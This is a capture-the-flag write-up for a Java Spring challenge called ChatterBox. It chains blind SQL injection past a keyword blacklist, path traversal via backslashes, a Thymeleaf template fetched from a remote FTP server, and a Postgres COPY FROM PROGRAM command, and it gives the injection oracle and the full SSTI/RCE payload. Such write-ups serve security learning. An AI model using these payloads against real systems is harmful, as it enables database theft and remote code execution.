# ChatterBox Writeup

## tl;dr

Blind SQLi to get admin password -> `getResource()` bug to trigger ftp request -> Thymeleaf SSTI using `jdbc` to connect back to `postgres` -> `postgres` RCE (see `exploit.sh`, `sol.py`)

## Background
```
ChatterBox
Score: 194
Solves: 21
Web,difficulty:Normal

i wanna inject sth in my Box what should i do？

nc 47.89.225.36 9999
```

We get a Java server as a jar running on port `8080`, with a postgresql database in the same container. 3 endpoints, only 2 of which were used for the final exploit:

<details>
<summary><code>/login</code></summary>

```java
  @RequestMapping({"/login"})
  public String doLogin(HttpServletRequest request, Model model, HttpSession session) throws Exception {
    String username = request.getParameter("username");
    String password = request.getParameter("passwd");
    if (username != null && password != null) {
      if (!SQLCheck.checkBlackList(username) || !SQLCheck.checkBlackList(password)) {
        model.addAttribute("status", Integer.valueOf(500));
        model.addAttribute("message", "Ban!");
        return "error";
      } 
      String sql = "SELECT id,passwd FROM message_users WHERE username = '" + username + "'";
      if (SQLCheck.check(sql))
        try {
          List<String> pass = this.jdbcTemplate.query(sql, (RowMapper)new Object(this));
          if (!pass.isEmpty()) {
            String[] info = ((String)pass.get(0)).split("/");
            String dbPassword = info[1];
            if (dbPassword != null && dbPassword.equals(password)) {
              int userId = Integer.parseInt(info[0]);
              session.setAttribute("userId", Integer.valueOf(userId));
              return "redirect:/";
            } 
            model.addAttribute("status", Integer.valueOf(500));
            model.addAttribute("message", "Incorrect Username/Password);
          } else {
            model.addAttribute("status", Integer.valueOf(500));
            model.addAttribute("message", "Incorrect Username/Password);
          } 
          return "error";
        } catch (Exception var10) {
          model.addAttribute("status", Integer.valueOf(500));
          model.addAttribute("message", var10.toString());
          return "error";
        }  
      model.addAttribute("status", Integer.valueOf(500));
      model.addAttribute("message", "check error~");
      return "error";
    } 
    return "login";
  }
```
</details>

<details>
<summary><code>/notify</code></summary>

```java
  @GetMapping({"/notify"})
  public String notify(@RequestParam String fname, HttpSession session) throws IOException {
    Integer userId = (Integer)session.getAttribute("userId");
    if (userId != null && userId.intValue() == 1) {
      if (fname.contains("../"))
        return "error"; 
      InputStream inputStream = this.applicationContext.getResource(this.templatePrefix + this.templatePrefix + fname).getInputStream();
      if (inputStream != null && safeCheck(inputStream)) {
        String result = getTemplateEngine().process(fname, (IContext)new Context());
        return result;
      } 
      return "error";
    } 
    return "redirect:login";
  }
  
  public boolean safeCheck(InputStream stream) {
    try {
      String templateContent = new String(stream.readAllBytes());
      return (!templateContent.contains("<") && !templateContent.contains(">") && !templateContent.contains("org.apache") && !templateContent.contains("org.spring"));
    } catch (IOException var3) {
      return false;
    } 
  }
  
  private SpringTemplateEngine getTemplateEngine() {
    SpringResourceTemplateResolver resolver = new SpringResourceTemplateResolver();
    resolver.setApplicationContext(this.applicationContext);
    resolver.setTemplateMode(TemplateMode.HTML);
    resolver.setCharacterEncoding(StandardCharsets.UTF_8.name());
    resolver.setPrefix(this.templatePrefix);
    resolver.setSuffix(this.templateSuffix);
    SpringTemplateEngine templateEngine = new SpringTemplateEngine();
    templateEngine.setTemplateResolver((ITemplateResolver)resolver);
    return templateEngine;
  }
```
</details>

We run the docker container, decompile the jar with `jd-gui`, and get to work.

## Exploit

### Logging in

At first glance, we can tell that there is a SQL injection vulnerability in `/login`:
```java
String sql = "SELECT id,passwd FROM message_users WHERE username = '" + username + "'";
```
`username`, which we control, is unfortunately behind a blacklist, the size of which is staggering:

<details>
<summary><code>checkBlackList(String sql)</code></summary>

```java
  public static boolean checkBlackList(String sql) {
    String temp;
    sql = sql.toUpperCase();
    Iterator<String> blackList = getBlackList().stream().iterator();
    do {
      if (!blackList.hasNext())
        return true; 
      temp = blackList.next();
    } while (!sql.contains(temp));
    return false;
  }
  
  private static List<String> getBlackList() {
    List<String> black = new ArrayList<>();
    black.add("SELECT");
    black.add("UNION");
    black.add("INSERT");
    black.add("ALTER");
    black.add("SLEEP");
    black.add("DELETE");
    black.add("--");
    black.add(";");
    black.add("#");
    black.add("&");
    black.add("/*");
    black.add("OR");
    black.add("EXEC");
    black.add("CREATE");
    black.add("AND");
    black.add("DROP");
    black.add("DO");
    black.add("COPY");
    black.add("SET");
    black.add("VACUUM");
    black.add("SHOW");
    black.add("CURSOR");
    black.add("TRUNCATE");
    black.add("CAST");
    black.add("BEGIN");
    black.add("PERFORM");
    black.add("END");
    black.add("CASE");
    black.add("WHEN");
    black.add("ALL");
    black.add("TABLE");
    black.add("UPDATE");
    black.add("TRIGGER");
    black.add("FUNCTION");
    black.add("PROCEDURE");
    black.add("DECLARE");
    black.add("RETURNING");
    black.add("TABLESPACE");
    black.add("VIEW");
    black.add("SEQUENCE");
    black.add("INDEX");
    black.add("LOCK");
    black.add("GRANT");
    black.add("REVOKE");
    black.add("SAVEPOINT");
    black.add("ROLLBACK");
    black.add("IMPORT");
    black.add("COMMIT");
    black.add("PREPARE");
    black.add("EXECUTE");
    black.add("EXPLAIN");
    black.add("ANALYZE");
    black.add("DATABASE");
    black.add("PASSWORD");
    black.add("CONNECT");
    black.add("DISCONNECT");
    black.add("PG_SLEEP");
    black.add("MERGE");
    black.add("USING");
    black.add("LIMIT");
    black.add("OFFSET");
    black.add("RETURN");
    black.add("ESCAPE");
    black.add("LIKE");
    black.add("ILIKE");
    black.add("RLIKE");
    black.add("EXISTS");
    black.add("BETWEEN");
    black.add("IS");
    black.add("NULL");
    black.add("NOT");
    black.add("GROUP");
    black.add("BY");
    black.add("HAVING");
    black.add("ORDER");
    black.add("WINDOW");
    black.add("PARTITION");
    black.add("OVER");
    black.add("FOREIGN KEY");
    black.add("REFERENCE");
    black.add("RAISE");
    black.add("LISTEN");
    black.add("NOTIFY");
    black.add("LOAD");
    black.add("SECURITY");
    black.add("OWNER");
    black.add("RULE");
    black.add("CLUSTER");
    black.add("COMMENT");
    black.add("CONVERT");
    black.add("COPY");
    black.add("CHECKPOINT");
    black.add("REINDEX");
    black.add("RESET");
    black.add("LANGUAGE");
    black.add("PLPGSQL");
    black.add("PLPYTHON");
    black.add("SECDEF");
    black.add("NOCREATEDB");
    black.add("NOCREATEROLE");
    black.add("NOINHERIT");
    black.add("NOREPLICATION");
    black.add("BYPASSRLS");
    black.add("FILE");
    black.add("PG_");
    black.add("IMPORT");
    black.add("EXPORT");
    return black;
  }
```

</details>

This prevents us from appending an extra `a'; COPY (SELECT '') TO PROGRAM '/readflag';--` at the end of the query, which would have been an instant win. Instead, we found we can do string concatenations (`a' || 'b' || 'c`), and using this, we can call functions (`a' || somefunc('b') || 'c`).

`doLogin()` does not reveal anything to the client depending on if the query returned something or nothing. It _does_ throw a 500 when the query encounters an error, so our goal at this point became triggering an error based on some character in `passwd`. We essentially just did a `select proname from pg_proc;`, taking a look at every function available to us, and seeing which ones did not run afoul of the blacklist. This got us:

```
1/int4(textregexeq(substring(passwd,0,1),'x'))
```
- `substring(passwd,0,1)` gets a single character from passwd at pos 0
- `textregexex(ourchar, 'x')` returns true or false if `ourchar=='x'`
- `int4(cond)` coerces `true` to 1, `false` to 0
- `1/num` throws a division by 0 error if `false`, otherwise ok if `true`

So, we build a payload using this oracle, but we quickly realized that besides just the blacklist, the login procedure also ran our query through an AST-based filter at `SQLCheck.check(sql)`.

<details>
<summary><code>check(String sql)</code></summary>

```java
  public static boolean filter(String sql) {
    String whitePrefix;
    if (StringUtil.matches(sql, "^[a-zA-Z0-9_]*$"))
      return true; 
    if (sql.contains(" USER_DEFINE ") || (sql.startsWith("SELECT") && sql.contains("VIEW")))
      return true; 
    Iterator<String> whiteList = getWhitePrefix().stream().iterator();
    do {
      if (!whiteList.hasNext())
        return false; 
      whitePrefix = whiteList.next();
    } while (!sql.startsWith(whitePrefix));
    return true;
  }
  
  public static List<String> getWhitePrefix() {
    List<String> whiteList = new ArrayList<>();
    whiteList.add("delete from test where ");
    whiteList.add("update test set ");
    whiteList.add("select * from test");
    return whiteList;
  }
  
  public static List<String> getWhiteTable() {
    List<String> whiteTable = new ArrayList<>();
    whiteTable.add("USERS");
    whiteTable.add("MESSAGES");
    whiteTable.add("MESSAGE_USERS");
    return whiteTable;
  }
  
  public static Boolean filterTableName(SQLExprTableSource sqlExprTableSource) {
    String tableName = ((SQLIdentifierExpr)sqlExprTableSource.getExpr()).getName();
    return Boolean.valueOf(!!getWhiteTable().contains(tableName));
  }
  
  private static boolean checkValid(String sql) {
    try {
      return SQLParser.parse(sql);
    } catch (SQLException var9) {
      try {
        SQLStatement statement;
        List<SQLStatement> sqlStatements = SQLUtils.parseStatements(sql, JdbcConstants.POSTGRESQL);
        if (sqlStatements != null && sqlStatements.size() > 1)
          return false; 
        Iterator<SQLStatement> sqlIterator = sqlStatements.stream().iterator();
        do {
          if (!sqlIterator.hasNext())
            return false; 
          statement = sqlIterator.next();
        } while (!(statement instanceof com.alibaba.druid.sql.dialect.postgresql.ast.stmt.PGSelectStatement));
        SQLSelect sqlSelect = ((SQLSelectStatement)statement).getSelect();
        SQLSelectQuery sqlSelectQuery = sqlSelect.getQuery();
        if (sqlSelectQuery instanceof com.alibaba.druid.sql.ast.statement.SQLUnionQuery)
          return false; 
        SQLSelectQueryBlock sqlSelectQueryBlock = (SQLSelectQueryBlock)sqlSelectQuery;
        if (!filtetFields(sqlSelectQueryBlock.getSelectList()))
          return false; 
        if (!filterTableName((SQLExprTableSource)sqlSelectQueryBlock.getFrom()).booleanValue())
          return false; 
        if (!filterWhere(sqlSelectQueryBlock.getWhere()))
          return false; 
        return true;
      } catch (Exception var8) {
        if (filter(sql))
          return true; 
        throw new SQLException("SQL Parsing Exception~");
      } 
    } 
  }
  
  private static boolean filtetFields(List<SQLSelectItem> selectList) {
    for (int i = 0; i < selectList.size(); i++) {
      Object element = selectList.get(i);
      if (element instanceof SQLSelectItem) {
        SQLExpr expr = ((SQLSelectItem)element).getExpr();
        if (expr instanceof com.alibaba.druid.sql.ast.expr.SQLQueryExpr)
          return false; 
      } 
    } 
    return true;
  }
  
  private static boolean filterWhere(SQLExpr where) {
    SQLExpr left = ((SQLBinaryOpExpr)where).getLeft();
    SQLExpr right = ((SQLBinaryOpExpr)where).getRight();
    if (left instanceof SQLBinaryOpExpr && !filterWhere(left))
      return false; 
    if (right instanceof SQLBinaryOpExpr && !filterWhere(right))
      return false; 
    return (allowExpr.contains(left.getClass()) && allowExpr.contains(right.getClass()));
  }
  
  public static boolean check(String sql) {
    sql = sql.toUpperCase();
    return checkValid(sql);
  }
  
  static {
    allowExpr.add(SQLTimeExpr.class);
    allowExpr.add(SQLNullExpr.class);
    allowExpr.add(SQLNumericLiteralExpr.class);
    allowExpr.add(SQLNotExpr.class);
    allowExpr.add(SQLIntegerExpr.class);
    allowExpr.add(SQLNumberExpr.class);
    allowExpr.add(SQLDateExpr.class);
    allowExpr.add(SQLDoubleExpr.class);
    allowExpr.add(SQLCharExpr.class);
    allowExpr.add(SQLBooleanExpr.class);
    allowExpr.add(SQLAllColumnExpr.class);
    allowExpr.add(SQLDateTimeExpr.class);
    allowExpr.add(SQLIdentifierExpr.class);
  }
```

</details>

<details>
<summary><code>SQLParser</code></summary>

```java
public class SQLParser {
  private static Class[] restrictExprCls = new Class[] { LongValue.class, StringValue.class, NullValue.class, TimeValue.class, TimestampValue.class, DateValue.class, DoubleValue.class, Column.class };
  
  public static boolean parse(String sql) {
    try {
      CCJSqlParserManager parserManager = new CCJSqlParserManager();
      Statement statement = parserManager.parse(new StringReader(sql));
      if (statement instanceof Select)
        return processSelect((Select)statement); 
      return (statement instanceof Insert) ? processInsert((Insert)statement) : false;
    } catch (Exception var3) {
      throw new SQLException("SQL error");
    } 
  }
  
  private static boolean processInsert(Insert statement) {
    return true;
  }
  
  private static boolean restrictExpr(BinaryExpression expression) {
    Expression left_expr = expression.getLeftExpression();
    Expression right_expr = expression.getRightExpression();
    if (left_expr instanceof BinaryExpression)
      return restrictExpr((BinaryExpression)left_expr); 
    if (right_expr instanceof BinaryExpression)
      return restrictExpr((BinaryExpression)right_expr); 
    List<Class<?>> arrays = Arrays.asList((Class<?>[][])restrictExprCls);
    return (arrays.contains(left_expr.getClass()) && arrays.contains(right_expr.getClass()));
  }
  
  private static boolean processSelect(Select statement) {
    SelectBody selectBody = statement.getSelectBody();
    if (selectBody instanceof PlainSelect) {
      PlainSelect plainSelect = (PlainSelect)selectBody;
      FromItem fromItem = plainSelect.getFromItem();
      if (fromItem instanceof Table) {
        String tablename = ((Table)fromItem).getName();
        List<String> whiteTable = SQLCheck.getWhiteTable();
        if (!whiteTable.contains(tablename))
          return false; 
        BinaryExpression expression = (BinaryExpression)plainSelect.getWhere();
        if (!restrictExpr(expression))
          return false; 
        return true;
      } 
    } 
    return false;
  }
}
```

</details>

Oddly, they run our SQL query through [JSql](https://jsqlparser.sourceforge.net/), and if it throws an exception, it uses another SQL parser (`druid`). Either filter is quite strict, not letting any functions through, and as far as we saw, did not contain any logic bugs, but the aforementioned `JSql` package has not been updated since 2013. We also found [this](https://sourceforge.net/p/jsqlparser/discussion/360150/thread/0e9d493cbd/?limit=25#28d8) discussion post about how `JSql` would drop rows or something, so we thought to try padding the query with additional string concats (`a' || 'b' || 'c' || 'd' || ... || <error_cond_exploit> || 'z`) and maybe it would drop a few AST nodes? Lo and behold, _it just worked_.

So, with that, we have a working oracle, which lets us exfiltrate the admin password character by character, after which we get to log in.

### Finding a way to trigger SSTI

We now get to access `/notify`. To recap, `notify()` takes our provided `fname`, prepends the prefix `file:///non_exists/` to it, grabs whatever is at this resource location (`this.applicationContext.getResource(path)`), and returns it, which `Spring` then resolves to a view (i.e., `index` resolves to `index.html`, `redirect:/login` resolves to a redirect header with location `/login`). It also strips any `../` from `fname`, so no easy path traversal.

Well, we grab the `pom.xml` from the decompiled jar, generate a maven project from it, copy `applicationContext.getResource(path)` and some surrounding code to make it execute, and start stepping through what `getResource(path)` actually does:

<details>
<summary><code>ChatterBoxApplication.java</code> (our test rig)</summary>

```java
package com.classes.chatterbox;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;

import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.thymeleaf.context.Context;
import org.thymeleaf.context.IContext;
import org.thymeleaf.spring6.SpringTemplateEngine;
import org.thymeleaf.spring6.templateresolver.SpringResourceTemplateResolver;
import org.thymeleaf.templatemode.TemplateMode;
import org.thymeleaf.templateresolver.ITemplateResolver;

// @SpringBootApplication
public class ChatterBoxApplication {
  public static void main(String[] args) {
    // String basePayload = "'baka' || ";
    // String payload = "ayo' || ";
    // for (int i = 0; i < 200; i++) {
    //   payload += basePayload;
    // }
    // // payload += "length(int4(substring(passwd,0,2)='a')) || ";
    // payload += "1/int4(textregexeq(substring('abcd',0,2),'a')) ||";
    // payload += "'ayo";
    // String sql = "SELECT id,passwd FROM message_users WHERE username = '" + payload + "'";
    // boolean res = SQLCheck.check(sql);
    // System.out.println(res);
    try {
      ApplicationContext ctx = new AnnotationConfigApplicationContext();
      String fname = "..\\payload?.txt";
      String templatePrefix = "file:./non_exists/";
      String templateSuffix = ".html";
      if (fname.contains("../")) System.out.println("baka");
      InputStream inputStream = ctx.getResource(templatePrefix + fname).getInputStream();
      if (inputStream != null && safeCheck(inputStream)) {
        // setting up the template engine lol
        SpringResourceTemplateResolver resolver = new SpringResourceTemplateResolver();
        resolver.setApplicationContext(ctx);
        resolver.setTemplateMode(TemplateMode.HTML);
        resolver.setCharacterEncoding(StandardCharsets.UTF_8.name());
        resolver.setPrefix(templatePrefix);
        resolver.setSuffix(templateSuffix);
        SpringTemplateEngine templateEngine = new SpringTemplateEngine();
        templateEngine.setTemplateResolver((ITemplateResolver)resolver);

        String result = templateEngine.process(fname, (IContext)new Context());
        System.out.println(result);
      } 
    } catch (Exception e) {
      e.printStackTrace();
    }
  } 

    static public boolean safeCheck(InputStream stream) {
    try {
      String templateContent = new String(stream.readAllBytes());
      return (!templateContent.contains("<") && !templateContent.contains(">") && !templateContent.contains("org.apache") && !templateContent.contains("org.spring"));
    } catch (Exception var3) {
      return false;
    } 
  }
}
```

(+ `SQLCheck.java`, `SQLParser.java`, `StringUtils.java`)

</details>

```java
        try {
            // Try to parse the location as a URL...
            URL url = ResourceUtils.toURL(location);
            return (ResourceUtils.isFileURL(url) ? new FileUrlResource(url) : new UrlResource(url));
        }
```

```java
	public static URL toURL(String location) throws MalformedURLException {
		try {
			// Prefer URI construction with toURL conversion (as of 6.1)
			return toURI(StringUtils.cleanPath(location)).toURL();
		}
```

```java
	public static String cleanPath(String path) {
		if (!hasLength(path)) {
			return path;
		}

		String normalizedPath = replace(path, WINDOWS_FOLDER_SEPARATOR, FOLDER_SEPARATOR);
		String pathToUse = normalizedPath;
```

Aha, `replace(path, WINDOWS_FOLDER_SEPARATOR, FOLDER_SEPARATOR)`. This lets us smuggle `../` by using `..\\`, so we get path traversal. Furthermore, we can append a question mark at the end of `fname` (`..\\payload?`) at the end of the filename to have `toUrl()` parse any suffix appended to our location be ignored (it appends `.html`), so we can have any arbitrary file be read.

We still have to deal with `safeCheck()`, which won't let through any angle brackets (`<`, `>`) or `org.spring`, `org.apache`. Online examples for thymeleaf templates that look like HTML all include angle brackets (`<p th:with="${sometemplatestuff}">`), and the template engine's default mode is explicitly set to `TemplateMode.HTML`.

It's a bunch of some more stepping through `getTemplateEngine().process(fname, ...);`, but the gist is that Thymeleaf will make a guess based on the file's file extension, which it gets by a simple `templateName.substring(lastIndexOf('.'))`. So, we append a `.txt` at the end of `fname` to have Thymeleaf interpret templates in TEXT mode (`[# th:with="a=${templatestuff}]`), which doesn't run afoul of the `safeCheck` filter.

```java
    public static TemplateMode computeTemplateModeForTemplateName(final String templateName) {

        final String fileExtension = computeFileExtensionFromTemplateName(templateName);
        if (fileExtension == null) {
            return null;
        }

        final String mimeType = MIME_TYPE_BY_FILE_EXTENSION.get(fileExtension);
        if (mimeType == null) {
            return null;
        }

        return TEMPLATE_MODE_BY_MIME_TYPE.get(mimeType);

    }

    private static String computeFileExtensionFromTemplateName(final String templateName) {

        if (templateName == null || templateName.trim().length() == 0) {
            return null;
        }

        final int pointPos = templateName.lastIndexOf('.');
        if (pointPos < 0) {
            // No extension, so nothing to use for resolution
            return null;
        }

        return templateName.substring(pointPos).toLowerCase(Locale.US).trim();

    }
```

Last remaining roadblock: how to get a file on the docker container, that we can then trigger SSTI on. We ended up wasting a lot of time here before realizing that, if you add in enough path traversals in `fname`, it will end up making an `ftp` connection to the first segment in the path, at port `21`. So, spin up an ftp server on a remote box, host the payload there, and we can trigger SSTI.

<details>
<summary>Other ways to trigger SSTI that we tried</summary>

- `/var/lib/postgresql/13/main/pg_wal`: A transaction log which contained the results of SQL insertions in the `/post_message` route, but didn't work because the file was too large.
- `/var/lib/postgresql/13/main/base/13443/16392`: An on-disk file which postgres would write our templates to after 5~ish minutes if we included them in a SQL insert, which worked on local but we couldn't get working on remote (instance kept closing lol) before the orgs patched the chal to have the user `java` run the jar, as opposed to `root`. This meant that we could no longer access files belonging to the user `postgres`.

</details>

### Using SSTI to get RCE

So, we have SSTI, but as it turns out, Thymeleaf implements some sort of blacklist on classes which it deems dangerous (as can be seen from how they patched [this](https://nvd.nist.gov/vuln/detail/CVE-2023-38286)). Furthermore, `safeCheck` earlier also bans `org.spring` and `org.apache` in our payload, so we have to make do with the remaining gadgets in our classpath.

We ended up going with reconnecting to `postgres` to trigger RCE there instead. Per [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-to-program), we can trigger RCE, injecting command output into a table of our choice, comma delineated and padded with extra input to match the schema of `messages`.

Query: 
```sql
'copy messages from program ''echo -n 6942069,1, ; echo -n `/readflag` ; echo ,2024-01-01'' csv;'
```

SSTI Payload:
```
redirect:/?exfil=[# th:with="a=${new org.postgresql.Driver().connect('jdbc:postgresql://127.0.0.1:5432/postgres?user=postgres&password=postgres', null).createStatement().executeUpdate('copy messages from program ''echo -n 6942069,1, ; echo -n `/readflag` ; echo ,2024-01-01'' csv;')}"][/]
```

And with this, we've injected flag into the `messages` table, which we can access at `/`.